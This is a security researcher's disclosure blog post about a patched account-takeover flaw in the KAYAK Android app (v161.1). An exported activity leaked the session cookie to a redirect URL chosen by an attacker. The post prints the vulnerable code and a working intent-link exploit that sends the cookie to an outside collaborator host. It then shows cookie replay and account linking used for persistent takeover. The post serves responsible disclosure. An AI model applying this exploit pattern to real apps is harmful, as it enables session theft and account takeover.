---
slug: account-takeover-kayak/
title: Account Takeover in KAYAK
date: 2022-11-23
subtitle: So it's the app itself that delivers the cookie to me?
category: attacks
tags: vulnerability, hacking, exploit, software, code
image: https://res.cloudinary.com/fluid-attacks/image/upload/v1669164815/blog/account-takeover-kayak/cover_account_takeover_kayak.webp
alt: Photo by Nahel Abdul Hadi on Unsplash
description: In this blog post, I present in detail a zero-day vulnerability I discovered in KAYAK v161.1, along with the steps to follow to replicate the exploit.
keywords: Kayak, Mobile Application, Android, Session Cookie, Vulnerability, Exploit, Improper Access Control, Ethical Hacking, Pentesting
author: Carlos Bello
writer: cbello
name: Carlos Bello
about1: Security Researcher
source: https://unsplash.com/es/fotos/flha0KwRrRc
---

While researching zero-day vulnerabilities in mobile applications,
I found it's possible to steal a user's session cookie
through a malicious deeplink
in KAYAK v161.1.
Below,
I will explain this vulnerability in detail,
where it is located in the code
and what steps must be taken to replicate the exploit.

## Where is this vulnerability?

I found the following exported activity
in the AndroidManifest.xml file:

```xml
<activity android:name="com.kayak.android.web.ExternalAuthLoginActivity" android:exported="true" android:launchMode="singleTask">
    <intent-filter>
        <data android:scheme="kayak"/>
        <data android:host="externalAuthentication"/>
        <action android:name="android.intent.action.VIEW"/>
        <category android:name="android.intent.category.DEFAULT"/>
        <category android:name="android.intent.category.BROWSABLE"/>
    </intent-filter>
</activity>
```

This means that
any app installed on a mobile device
with that vulnerable version of KAYAK
can interact with this activity.
In addition,
this activity can be called from a deeplink
and accepts implicit intents.

## ExternalAuthLoginActivity

After noticing that,
I immediately went to the exported activity
to see what it did and how it did it.
While analyzing and reading the source code,
I came across two very striking functions:

```java
 private final String getRedirectUrl() {
        String stringExtra = getIntent().getStringExtra(EXTRA_REDIRECT_URL);
        return stringExtra == null ? "" : stringExtra;
 }

 private final void launchCustomTabs() {
        m.d b10 = new d.a(this.helper.getSession()).g(true).b();
        p.d(b10, "Builder(helper.session)\n…rue)\n            .build()");
        Uri.Builder buildUpon = Uri.parse(getRedirectUrl()).buildUpon();
        buildUpon.appendQueryParameter(SESSION_QUERY_PARAM, l.getInstance().getSessionId());
        i.openCustomTab(this, b10, buildUpon.build(), null);
 }
```

Since the activity is exported,
a malicious web page via a deeplink,
or a malicious mobile app via an intent,
could set up a malicious RedirectUrl
using the getRedirectUrl function.
Okay,
but for this to have an impact,
we need to see what we can do about this behavior.

That's where the launchCustomTabs method comes in,
which,
as we see,
concatenates a GET parameter to the URL.
That GET parameter is the mobile app user's session cookie:

```java
public final String getSessionId() {
        String cookieValueInternal;
        synchronized (this) {
            cookieValueInternal = getCookieValueInternal(SESSION_COOKIE_NAME);
        }
        return cookieValueInternal;
}
```

```java
public static final String SESSION_COOKIE_NAME = "p1.med.sid";
```

With this in mind,
I didn't hesitate to log into the web application
and delete all cookies
to end up with a request like the following:

```txt
GET /profile/dashboard HTTP/2
Host: www.kayak.com.co
Cookie: p1.med.sid=[Cookie Here];
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
```

I uploaded the exploit to a malicious server:

```html
<!DOCTYPE html>
<html>
    <body>
        <a id="exploit" href="intent://externalAuthentication#Intent;scheme=kayak;package=com.kayak.android;component=com.kayak.android.web.ExternalAuthLoginActivity;action=android.intent.action.VIEW;S.ExternalAuthLoginActivity.EXTRA_REDIRECT_URL=https://jsfl9yn414bp1z2sujwfjsj3ruxlla.burpcollaborator.net;end">Exploit</a>;
    </body>
</html>
```

Then,
I opened it from the mobile app.
Checking the malicious server logs,
I saw how my account session cookie was leaked.
So I copied it and put it in the request I showed above:

```html
GET /profile/dashboard HTTP/2
Host: www.kayak.com.co
Cookie: p1.med.sid=65-R-4rhBEjEeCTHTB5bkcdEoO-RUM4RJuW5YvCJ3nfrsvdH0UbkjGBywHzVgsV0u8_Ys-4ay0zqH2q0Jt8H8EXM2yN-QEmydDQIbJ1eAmYZzh6nablokLtpHYCBUNGs7aoae;
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
```

<cta-banner
  buttontxt="Read more"
  link="/solutions/ethical-hacking/"
  title="Get started with Fluid Attacks' Ethical Hacking solution right now"
/>

## Account takeover POC

Below is a video demonstration of the exploitation
of this vulnerability:

<div class="tc">

<iframe
  width="560"
  height="315"
  src="https://www.youtube.com/embed/vmTDH8QpMnA"
  frameborder="0"
  allowfullscreen
>
</iframe>

</div>

## Problems and more problems - Account linking

I have found that
once I steal the victim's cookie
and log into the web application with it,
I can see the victim's data without any problem.
However,
I cannot edit them for some strange reason.
Therefore,
investigating the web application,
I realized that an attacker could gain full access to the account
—and then view, edit, delete information, etc.—
by simply linking a Google account
(or any other available provider).

In this case,
I linked a Google account corresponding to the attacker
to the victim's account.
The goal was that
the attacker would then only have to log into the application
from his Google account
to gain access to the victim's account.

<div class="tc">

<iframe
  width="560"
  height="315"
  src="https://www.youtube.com/embed/AgJRDqsawHU"
  frameborder="0"
  allowfullscreen
>
</iframe>

</div>

That's it.
An unauthenticated,
remote attacker can steal the account of any victim
logged into the KAYAK mobile app for Android
with a one-click attack.

## Timeline

### August 12, 2022

- Vulnerability reported:
  Improper Access Control
  (CVSS: 9.3; Critical)

- Vulnerability triaged

### August 13, 2022

- Vulnerability remediated

- KAYAK v161.2 (10048) available on Play Store
